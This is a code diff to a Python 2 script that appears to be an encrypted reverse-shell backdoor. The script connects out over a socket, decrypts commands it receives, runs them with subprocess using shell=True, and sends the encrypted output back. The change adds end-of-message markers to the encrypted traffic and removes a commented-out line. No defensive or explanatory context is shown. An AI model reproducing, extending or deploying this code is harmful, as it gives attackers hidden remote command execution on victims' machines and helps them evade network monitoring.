@@ -26,7 +26,7 @@ except socket.error as msg:
 print 'Socket connect complete'
 
 #Start listening on socket
-success = box.encrypt('Hello There!')
+success = box.encrypt('Hello There!EOFEOFEOFEOFEOFX')
 s.send(success)
 #now keep talking with the client
 while 1:
@@ -37,8 +37,7 @@ while 1:
 
     proc = subprocess.Popen(dataDec, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     stdoutput = proc.stdout.read() + proc.stderr.read()
-    stdoutputEnc = box.encrypt(stdoutput)
+    stdoutputEnc = box.encrypt(stdoutput + 'EOFEOFEOFEOFEOFX')
     s.send(stdoutputEnc)
 
-#s.send(box.encrypt('bye now!'))
 s.close()
